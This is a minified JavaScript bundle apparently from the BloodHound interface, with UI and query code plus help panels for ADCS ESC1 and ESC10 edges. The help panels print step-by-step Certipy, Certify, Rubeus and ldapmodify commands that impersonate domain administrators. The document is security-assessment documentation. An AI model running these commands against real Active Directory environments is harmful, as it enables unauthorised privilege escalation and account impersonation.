import{r as p,c3 as Kt,c4 as zt,h_ as at,cb as Ht,c5 as Ee,h$ as Vt,aa as e,c7 as Yt,c6 as ot,c9 as Qt,i0 as Jt,ca as Xt,i1 as Zt,i2 as Se,dm as De,bz as le,fV as er,bF as tr,fM as Le,fS as it,fO as st,fN as rr,fT as nr,cs as ar,ct as or,a7 as qe,aJ as q,ai as ae,bH as xe,cx as je,cG as vt,i3 as ir,i4 as sr,du as t,bL as l,dO as H,bQ as K,i5 as E,i6 as n,i7 as J,i8 as B,i9 as P,R as be,ia as w,ib as M,ic as N,hJ as cr,gT as ct,eG as lr,ek as dr,ej as Ke,cJ as hr,fd as pr,bp as ur,c0 as ze,bo as mr,dz as br,ce as we,bR as At,hU as fr,hV as yr,hW as gr,ac as oe,id as xr,hY as jr,hZ as wr,cy as Q,ie as vr,e$ as Ce,hC as Ar,hF as Sr,cV as Cr,cW as kr,hI as St,gX as Tr,e2 as Pr,hG as Dr,fb as Or,gH as Rr,e1 as Er,cv as Ir,cU as lt,ig as $r,ih as Gr,e0 as Nr,cz as $e,cA as Ze,cB as Ge,dP as Ct,cC as Ne,ab as U,ep as ue,aj as et,eo as me,cR as kt,cM as Tt,cN as Pt,cj as Mr,cO as Dt,ii as Lr,ij as Fr,cQ as Ot,ik as He,hK as ve,ay as Ie,bs as ke,il as _r,dC as Fe,dD as _e,dE as Ue,im as Rt,io as Et,aS as ge,em as Ur,Z as Wr,eN as Br,bq as It,br as $t,bt as Gt,ip as qr,iq as Ve,cT as Kr,ao as dt,ap as ht,ba as pt,aK as zr,aq as ut,aA as Oe,bE as Nt,ir as Hr,af as Vr,bm as Yr,cP as Qr,aB as Jr,aC as Xr,aD as Zr,aE as en,aF as tn,aH as rn,b8 as nn,bl as an,b9 as on,al as mt,bA as sn,b1 as bt,b0 as ft,bg as cn,cI as ln,cK as dn,eW as hn,is as pn,dG as Mt,dW as un,it as mn,iu as bn,dw as yt,dF as fn,iv as yn,iw as gn,ix as xn,iy as jn}from"./index-DV5vAjQm.js";import{g as Ye,u as Qe}from"./useSearch-BB_-T_X7.js";import{E as wn,A as vn,c as An,d as Sn,b as Cn,u as kn,D as Re,O as Tn}from"./EntityInfoDataTable-A7rM9L2l.js";import{a as Pn}from"./capitalize-CoGxfxlT.js";import{g as tt,V as X,S as Dn,E as Je}from"./ExploreSearchCombobox-BJbkwezM.js";import{C as Lt}from"./CypherEditor-B5mKnHUQ.js";const On=["alignItems","autoFocus","component","children","dense","disableGutters","divider","focusVisibleClassName","selected","className"],Rn=(r,a)=>{const{ownerState:o}=r;return[a.root,o.dense&&a.dense,o.alignItems==="flex-start"&&a.alignItemsFlexStart,o.divider&&a.divider,!o.disableGutters&&a.gutters]},En=r=>{const{alignItems:a,classes:o,dense:i,disabled:s,disableGutters:c,divider:d,selected:h}=r,m=Qt({root:["root",i&&"dense",!c&&"gutters",d&&"divider",s&&"disabled",a==="flex-start"&&"alignItemsFlexStart",h&&"selected"]},Jt,o);return Ee({},o,m)},In=Yt(Xt,{shouldForwardProp:r=>Zt(r)||r==="classes",name:"MuiListItemButton",slot:"Root",overridesResolver:Rn})(({theme:r,ownerState:a})=>Ee({display:"flex",flexGrow:1,justifyContent:"flex-start",alignItems:"center",position:"relative",textDecoration:"none",minWidth:0,boxSizing:"border-box",textAlign:"left",paddingTop:8,paddingBottom:8,transition:r.transitions.create("background-color",{duration:r.transitions.duration.shortest}),"&:hover":{textDecoration:"none",backgroundColor:(r.vars||r).palette.action.hover,"@media (hover: none)":{backgroundColor:"transparent"}},[`&.${Se.selected}`]:{backgroundColor:r.vars?`rgba(${r.vars.palette.primary.mainChannel} / ${r.vars.palette.action.selectedOpacity})`:De(r.palette.primary.main,r.palette.action.selectedOpacity),[`&.${Se.focusVisible}`]:{backgroundColor:r.vars?`rgba(${r.vars.palette.primary.mainChannel} / calc(${r.vars.palette.action.selectedOpacity} + ${r.vars.palette.action.focusOpacity}))`:De(r.palette.primary.main,r.palette.action.selectedOpacity+r.palette.action.focusOpacity)}},[`&.${Se.selected}:hover`]:{backgroundColor:r.vars?`rgba(${r.vars.palette.primary.mainChannel} / calc(${r.vars.palette.action.selectedOpacity} + ${r.vars.palette.action.hoverOpacity}))`:De(r.palette.primary.main,r.palette.action.selectedOpacity+r.palette.action.hoverOpacity),"@media (hover: none)":{backgroundColor:r.vars?`rgba(${r.vars.palette.primary.mainChannel} / ${r.vars.palette.action.selectedOpacity})`:De(r.palette.primary.main,r.palette.action.selectedOpacity)}},[`&.${Se.focusVisible}`]:{backgroundColor:(r.vars||r).palette.action.focus},[`&.${Se.disabled}`]:{opacity:(r.vars||r).palette.action.disabledOpacity}},a.divider&&{borderBottom:`1px solid ${(r.vars||r).palette.divider}`,backgroundClip:"padding-box"},a.alignItems==="flex-start"&&{alignItems:"flex-start"},!a.disableGutters&&{paddingLeft:16,paddingRight:16},a.dense&&{paddingTop:4,paddingBottom:4})),$n=p.forwardRef(function(a,o){const i=Kt({props:a,name:"MuiListItemButton"}),{alignItems:s="center",autoFocus:c=!1,component:d="div",children:h,dense:u=!1,disableGutters:m=!1,divider:j=!1,focusVisibleClassName:v,selected:y=!1,className:b}=i,k=zt(i,On),A=p.useContext(at),S=p.useMemo(()=>({dense:u||A.dense||!1,alignItems:s,disableGutters:m}),[s,A.dense,u,m]),C=p.useRef(null);Ht(()=>{c&&C.current&&C.current.focus()},[c]);const T=Ee({},i,{alignItems:s,dense:S.dense,disableGutters:m,divider:j,selected:y}),R=En(T),G=Vt(C,o);return e.jsx(at.Provider,{value:S,children:e.jsx(In,Ee({ref:G,href:k.href||k.to,component:(k.href||k.to)&&d==="div"?"button":d,focusVisibleClassName:ot(R.focusVisible,v),ownerState:T,className:ot(R.root,b)},k,{classes:R,children:h}))})});var rt=(r=>(r.ALL="all",r.OWNED="owned",r.PUBLIC="public",r.SHARED="shared",r))(rt||{});const Gn=(r,a,o,i)=>{if(r.length!==a.length)return!1;const s=o?[...r].sort(o):[...r].sort(),c=o?[...a].sort(o):[...a].sort();return s.every((d,h)=>i?i(d,c[h]):d===c[h])},by=()=>{try{const r=document.createElement("canvas");return!!(window.WebGLRenderingContext&&r.getContext("webgl"))}catch{return!1}},Nn=({data:r,fileName:a,fileType:o})=>{const i=new Blob([r],{type:o}),s=document.createElement("a");s.download=a,s.href=window.URL.createObjectURL(i);const c=new MouseEvent("click",{view:window,bubbles:!0,cancelable:!0});s.dispatchEvent(c),s.remove()},Mn=r=>{Nn({data:JSON.stringify(r),fileName:"bh-graph.json",fileType:"text/json"})},fy=r=>p.useCallback(a=>{a==null||a.removeEventListener("wheel",a._wheelHandler);const o=i=>{i.preventDefault(),typeof r=="function"&&r(i)};a&&(a._wheelHandler=o,a==null||a.addEventListener("wheel",o,{passive:!1}))},[r]),Ln=()=>{const[r,a]=p.useState(""),{cypherSearch:o,setExploreParams:i}=le();return p.useEffect(()=>{if(o){const c=er(o);a(c)}else a("")},[o]),{cypherQuery:r,setCypherQuery:a,performSearch:c=>{i({searchType:"cypher",cypherSearch:tr(c??r)})}}},yy=()=>{const[r,a]=p.useState(""),[o,i]=p.useState(void 0),{primarySearch:s,searchType:c,setExploreParams:d}=le(),{keyword:h,type:u}=p.useMemo(()=>Ye(s??void 0),[s]),{data:m}=Qe(h,u);return p.useEffect(()=>{if(s&&m){const y=m.find(b=>b.objectid===s);y&&(a(y.name),i(y))}else a(""),i(void 0)},[s,c,m]),{searchTerm:r,selectedItem:o,editSourceNode:y=>{i(void 0),a(y)},selectSourceNode:y=>{const b=(y==null?void 0:y.objectid)??"",k=(y==null?void 0:y.name)??b;i(y),a(k),d({searchType:"node",primarySearch:b})}}},gy=()=>{const[r,a]=p.useState(Le),{pathFilters:o,setExploreParams:i}=le();return{selectedFilters:r,initialize:()=>{if(o!=null&&o.length){const h=o[0]===st?[]:o,u=nr(h,Le);a(u)}else a(Le)},handleApplyFilters:()=>{const h=it(r);h.length===0?i({pathFilters:[st]}):Gn(rr,h)?i({pathFilters:null}):i({pathFilters:it(r)})},handleUpdateFilters:h=>a(h)}},xy=()=>{const[r,a]=p.useState(""),[o,i]=p.useState(void 0),[s,c]=p.useState(""),[d,h]=p.useState(void 0),{primarySearch:u,secondarySearch:m,setExploreParams:j}=le(),{keyword:v,type:y}=p.useMemo(()=>Ye(u??void 0),[u]),{keyword:b,type:k}=p.useMemo(()=>Ye(m??void 0),[m]),{data:A}=Qe(v,y),{data:S}=Qe(b,k);return p.useEffect(()=>{if(u&&A){const f=Object.values(A).find(x=>x.objectid===u);f&&(a(f.name),i(f))}else a(""),i(void 0)},[u,A]),p.useEffect(()=>{if(m&&S){const f=Object.values(S).find(x=>x.objectid===m);f&&(c(f.name),h(f))}else c(""),h(void 0)},[m,S]),{sourceSearchTerm:r,sourceSelectedItem:o,destinationSearchTerm:s,destinationSelectedItem:d,handleSourceNodeEdited:f=>{i(void 0),a(f)},handleSourceNodeSelected:f=>{const x=(f==null?void 0:f.objectid)??"",D=(f==null?void 0:f.name)??x;i(f),a(D),j(m&&d?{searchType:"pathfinding",primarySearch:x}:{searchType:"node",primarySearch:x,secondarySearch:null})},handleDestinationNodeEdited:f=>{h(void 0),c(f)},handleDestinationNodeSelected:f=>{const x=(f==null?void 0:f.objectid)??"",D=(f==null?void 0:f.name)??x;h(f),c(D),j(u&&o?{searchType:"pathfinding",secondarySearch:x}:{searchType:"node",secondarySearch:x,primarySearch:null})},handleSwapPathfindingInputs:()=>{o&&d&&j({searchType:"pathfinding",primarySearch:d.objectid,secondarySearch:o.objectid})}}},jy=r=>{const{data:a,isFetching:o}=ar(),{searchType:i}=le(),[s,c]=p.useState(!1),[d,h]=p.useState(!1),m=!!(i==="cypher"&&a&&or(a));p.useEffect(()=>{r&&o&&c(!1)},[r,o]);const[j,v]=p.useMemo(()=>{if(r&&m){const y=qe(a.data.edges),b=!qe(a.data.nodes);return[y,b]}return[!1,!1]},[m,r,a]);return p.useEffect(()=>{if(!r||s)return;const y=m&&j&&v;y&&c(!0),h(y)},[m,v,j,r,s,h]),[d,h]},Fn=async r=>{var a,o,i;try{const s=await q.cypherSearch("MATCH (A) WHERE NOT A:MigrationData RETURN A LIMIT 1",r);return Object.keys((o=(a=s==null?void 0:s.data)==null?void 0:a.data)==null?void 0:o.nodes).length>0}catch(s){if(((i=s==null?void 0:s.response)==null?void 0:i.status)===404)return!1;throw s}},wy=r=>ae({queryKey:["getGraphHasData"],queryFn:({signal:a})=>Fn({signal:a}),...r}),ce={all:["savedQueries"],permissions:["permissions"],queryId:r=>[`query-id-${r}`]},_n=(r,a)=>q.getUserSavedQueries(r,a).then(o=>o.data.data),Un=(r,a)=>q.getExportCypherQuery(r,a).then(o=>o),Wn=(r,a)=>q.createUserQuery(r,a).then(o=>o.data.data),Bn=r=>q.updateUserQuery(r).then(a=>a.data.data),qn=(r,a)=>q.importUserQuery(r,a).then(o=>o.data),Kn=r=>q.deleteUserQuery(r).then(a=>a.data),zn=async(r,a)=>{var i;const o={query_id:void 0,public:!1,shared_to_user_ids:[]};if(!r)return o;try{return await q.getUserQueryPermissions(r,a).then(s=>s.data.data)}catch(s){const c=((i=s==null?void 0:s.response)==null?void 0:i.status)??(s==null?void 0:s.status);if(c===404||c===400)return o;throw s}},Ft=r=>ae({queryKey:tt([...ce.permissions],ce.queryId(r)),queryFn:({signal:a})=>zn(r,{signal:a}),retry:!1,enabled:typeof r<"u"}),Hn=({id:r,payload:a},o)=>q.updateUserQueryPermissions(r,a,o).then(i=>i.data),Vn=()=>{const r=xe();return je(Hn,{onSuccess:a=>{r.invalidateQueries(tt([...ce.permissions],ce.queryId(a.query_id)))}})},Yn=({id:r,payload:a},o)=>q.deleteUserQueryPermissions(r,a,o).then(i=>i.data),vy=()=>{const r=xe();return je(Yn,{onSuccess:a=>{r.invalidateQueries(tt([...ce.permissions],ce.queryId(a.query_id)))}})},_t=(r=rt.ALL,a)=>ae({queryKey:["savedQueries"],queryFn:({signal:o})=>_n(r,{signal:o}),...a}),Qn=()=>{const r=xe();return je(Wn,{onSuccess:()=>{r.invalidateQueries(ce.all)}})},Jn=()=>{const r=xe();return je(Bn,{onSuccess:()=>{r.invalidateQueries(ce.all)}})},Xn=()=>{const r=xe();return je(Kn,{onSuccess:()=>{r.invalidateQueries(ce.all)}})},Zn=()=>{const r=xe();return je(qn,{onSuccess:()=>{r.invalidateQueries(ce.all)}})},gt=r=>q.getSelf(r).then(a=>a.data.data),nt=()=>{const r=ae(["getSelf"],({signal:o})=>gt({signal:o}),{cacheTime:Number.POSITIVE_INFINITY,select:o=>o.id}),a=ae(["getSelf"],({signal:o})=>gt({signal:o}),{cacheTime:Number.POSITIVE_INFINITY,select:o=>(o==null?void 0:o.roles.map(s=>s.name))||[]});return{getSelfId:r,getSelfRoles:a}},Ut=()=>{const{data:r}=vt("tier_management_engine"),{getSelfId:a}=nt(),{data:o}=a,i=h=>(h==null?void 0:h.map(u=>({name:u.name,description:u.description,query:u.query,canEdit:u.user_id===o,id:u.id,user_id:u.user_id})))||[],c={category:"Saved Queries",subheader:"",queries:_t(rt.ALL,{select:i}).data||[]};return r!=null&&r.enabled?[...ir,c]:[...sr,c]},ea=(r,a)=>{const o=Ut();return p.useMemo(()=>{const s=o.flatMap(d=>d.queries??[]);if(a!=null){const d=s.find(h=>h.id===a);if(d)return d}const c=s.filter(d=>d.query===r);if(c.length!==0)return c.length===1?c[0]:c.find(d=>d.id!=null)??c[0]},[o,a,r])};var V=(r=>(r.relayTargets="relayTargets",r.composition="composition",r.aclInheritance="aclinheritance",r))(V||{});const ta={relayTargets:{endpoint:({sourceDBId:r,targetDBId:a,edgeName:o})=>q.getRelayTargets(r,a,o).then(i=>i.data)},composition:{endpoint:({sourceDBId:r,targetDBId:a,edgeName:o})=>q.getEdgeComposition(r,a,o).then(i=>i.data)},aclinheritance:{endpoint:({sourceDBId:r,targetDBId:a,edgeName:o})=>q.getACLInheritance(r,a,o).then(i=>i.data)}},xt=r=>typeof r=="number"?Number.isInteger(r):!!r,Z=({sourceDBId:r,targetDBId:a,edgeName:o,type:i},s)=>{var v;const{setExploreParams:c}=le(),{data:d,isLoading:h,isError:u}=ae([i,r,a,o],()=>ta[i].endpoint({sourceDBId:r,targetDBId:a,edgeName:o}),{enabled:xt(r)&&xt(a)&&!!o}),m=y=>{c({primarySearch:y,searchType:"node",exploreSearchTab:"node"})},j=Object.entries(((v=d==null?void 0:d.data)==null?void 0:v.nodes)||{}).map(([y,b])=>({name:b.label,objectId:b.objectId,graphId:y,kind:b.kind,...(s==null?void 0:s.withProperties)&&{properties:b.properties},onClick:()=>m(b.objectId)}));return{isLoading:h,isError:u,nodesArray:j}},ra=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},na=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the privileges to perform the ADCS ESC1 attack against the target domain."]}),e.jsx(t,{variant:"body2",children:"The principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials."})]}),aa=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"})]}),oa=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),ia=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned - Abusing Active Directory Certificate Services"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1",children:"Misconfigured Certificate Templates - ESC1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services",children:"HIDEANDSEC - ADCS"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy",children:"Certipy"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"Rubeus"})]}),sa=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1"}),": Use Certify (2.0) to request enrollment in the affected template, specifying the affected certification authority and target principal to impersonate:"]}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA --template ESC1 --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"The certificate PFX is printed to the console in a base64-encoded format."}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2"}),": With Rubeus, use the certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:"]}),e.jsx(t,{component:"pre",children:"Rubeus asktgt /user:Administrator /domain:forestroot.com /certificate:<cert base64> /ptt"}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 3"}),": Optionally verify the TGT by listing it with the klist command:"]}),e.jsx(t,{component:"pre",children:"klist"})]}),ca={general:na,windowsAbuse:sa,linuxAbuse:aa,opsec:oa,references:ia,composition:ra},la=({sourceDBId:r,targetDBId:a,edgeName:o})=>{const{isLoading:i,isError:s,nodesArray:c}=Z({sourceDBId:r,targetDBId:a,edgeName:o,type:V.composition});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The relationship represents the effective outcome of the configuration and relationships between several different objects. All objects involved in the creation of this relationship are listed here:"}),e.jsx(l,{py:1,children:i?e.jsx(H,{variant:"rounded"}):s?e.jsx(K,{severity:"error",children:"Couldn't load edge composition"}):e.jsx(X,{nodes:c})})]})},da=({sourceName:r,sourceType:a})=>{const o=J();return e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:[E(a,r)," has the privileges to perform the ADCS ESC10 Scenario A attack against the target domain.",e.jsx("br",{}),e.jsx("br",{}),"The principal has control over a victim principal with permission to enroll on one or more certificate templates, configured to enable certificate authentication and require the ",e.jsx("code",{children:"userPrincipalName"})," ","(UPN) of the enrollee included in the Subject Alternative Name (SAN). The victim also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, and chains up to a root CA for the forest. There is an affected Domain Controller (DC) configured to allow UPN certificate mapping. This setup lets the principal impersonate any AD forest computer, or any user where UPN does not match their ",e.jsx("code",{children:"sAMAccountName"}),", without knowing their credentials.",e.jsx("br",{}),e.jsx("br",{}),"The attacker principal can abuse their control over the victim principal to modify the victim’s UPN to match the ",e.jsx("code",{children:"sAMAccountName"}),` of a targeted principal followed by @CORP.LOCAL. Example: If the targeted principal is Administrator user of domain CORP.LOCAL, the victim's UPN will be populated with "Administrator@CORP.LOCAL". The attacker principal will then abuse their control over the victim principal to obtain the credentials of the victim principal, or a session as the victim principal, and enroll a certificate as the victim in one of the affected certificate templates. The UPN of the victim ("Administrator@CORP.LOCAL") will be included in the issued certificate under the SAN. Next, the attacker principal will again set the UPN of the victim, this time to an arbitrary string (e.g. the original value). The issued certificate can now be used for authentication against an affected DC. The UPN certificate mapping configuration on the DC make the DC use the SAN value to map the certificate to a principal when performing Schannel authentication. The DC will attempt to find a principal with a UPN matching the SAN value (“Administrator@CORP.LOCAL”) but as the victim’s UPN has been changed after the enrollment, there will be no principals with this UPN. The DC will then attempt to find a principal with a`," ",e.jsx("code",{children:"sAMAccountName"})," matching the SAN value and find the targeted user. In case the target is a computer, the DC will find it as well as the DC will attempt ",e.jsx("code",{children:"sAMAccountName"})," matching with a $ at the end of the SAN value as last resort. At last, the DC will authenticate the attacker as the targeted principal."]})},ha=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Set UPN of victim to targeted principal's ",e.jsx("code",{children:"sAMAccountName"})," followed by @ and the domain name.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL"})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their ",e.jsx("code",{children:"mail"})," ","attribute set for the certificate enrollment. The CertTemplate BloodHound node will have"," ",e.jsx("em",{children:'"Subject Require Email"'})," or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If any of the two flags are present, you will need the victim's mail attribute to be set. The value of the attribute will be included in the issues certificate but it is not used to identify the target principal why it can be set to any arbitrary string.",e.jsx("br",{}),e.jsx("br",{}),"Check if the victim has the mail attribute set using ldapsearch:"]}),e.jsx(t,{component:"pre",children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "VICTIM-DN" mail`}),e.jsxs(t,{variant:"body2",children:["If the victim has the mail attribute set, continue to Step 3.",e.jsx("br",{}),e.jsx("br",{}),"If the victim does not has the mail attribute set, set it to a dummy mail using ldapmodify:"]}),e.jsx(t,{component:"pre",children:`echo -e "dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`})]}),i=e.jsxs(l,{children:[e.jsxs(t,{variant:"body2",sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 3: "}),"Obtain the credentials of victim.",e.jsx("br",{}),e.jsx("br",{}),"There are several options for this step.",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a computer, you can obtain the credentials of the computer account using the Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),"). Alternatively, you can obtain a session as SYSTEM on the host, which allows you to interact with AD as the computer account, by abusing control over the computer AD object (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/generic-all",children:"GenericAll edge documentation"}),").",e.jsx("br",{}),e.jsx("br",{}),"If the victim is a user, you have the following options for obtaining the credentials:"]}),e.jsxs(B,{sx:{fontSize:"12px"},children:[e.jsxs(P,{children:["Shadow Credentials attack (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/add-key-credential-link",children:"AddKeyCredentialLink edge documentation"}),")"]}),e.jsxs(P,{children:["Password reset (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/force-change-password",children:"ForceChangePassword edge documentation"}),")"]}),e.jsxs(P,{children:["Targeted Kerberoasting (see"," ",e.jsx(n,{target:"blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/write-spn",children:"WriteSPN edge documentation"}),")"]})]})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 4: "}),"Enroll certificate as victim.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:"]}),e.jsx(t,{component:"pre",children:"certipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target CA-SERVER -template TEMPLATE"}),e.jsx(t,{variant:"body2",children:"The issued certificate will be saved to disk with the name of the targeted user."})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 5: "}),"Set UPN of victim to arbitrary value.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"certipy account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn victim@corp.local"})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 6: "}),"Perform Schannel authentication as targeted principal against affected DC using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Open an LDAP shell as the victim using Certipy by specifying the certificate created in Step 4 and the IP of an affected DC:"]}),e.jsx(t,{component:"pre",children:"certipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform this attack in the following steps:"}),a,o,i,s,c,d]})},pa=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate"}),ua=()=>{const r=[{label:"Certipy 4.0",link:"https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"Set-DomainObject",link:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject"},{label:"LDAPSearch",link:"https://linux.die.net/man/1/ldapsearch"},{label:"LDAPModify",link:"https://linux.die.net/man/1/ldapmodify"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},ma=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Create .exe version of Certipy.",e.jsx("br",{}),e.jsx("br",{}),"Install PyInstaller on a host with python installed, clone down Certipy from GitHub, and run this cmdlet from the root of the GitHub repo to bundle the python project into an .exe binary which can be used on Windows computer where Python is not installed:"]}),e.jsx(t,{component:"pre",children:"pyinstaller ./Certipy.spec"}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["The Certipy.exe will be in the ",e.jsx("code",{children:"dist"})," folder."]})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "})," Set UPN of victim to targeted principal's ",e.jsx("code",{children:"sAMAccountName"})," followed by @ and the domain name.",e.jsx("br",{}),e.jsx("br",{}),"Set the UPN of the victim principal using Certipy:"]}),e.jsx(t,{component:"pre",children:"Certipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL"})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,sx:{marginBottom:"-8px"},children:[e.jsx("b",{children:"Step 3: "}),"Check if ",e.jsx("code",{children:"mail"})," attribute of victim must be set and set it if required.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 2 or above and its attribute"," ",e.jsx("code",{children:"msPKI-CertificateNameFlag"})," contains the flag ",e.jsx("code",{children:"SUBJECT_REQUIRE_EMAIL"})," and/or"," ",e.jsx("code",{children:"SUBJECT_ALT_REQUIRE_EMAIL"})," then the victim principal must have their mail attribute set for the certificate enrollment. The CertTemplate BloodHound node will have ",e.jsx("em",{children:'"Subject Require Email"'})," ","or ",e.jsx("em",{children:'"Subject Alternative Name Require Email"'})," set to true if any of the flags are present.",e.jsx("br",{}),e.jsx("br",{}),"If the certificate template is of schema version 1 or does not have any of the email flags, then continue to Step 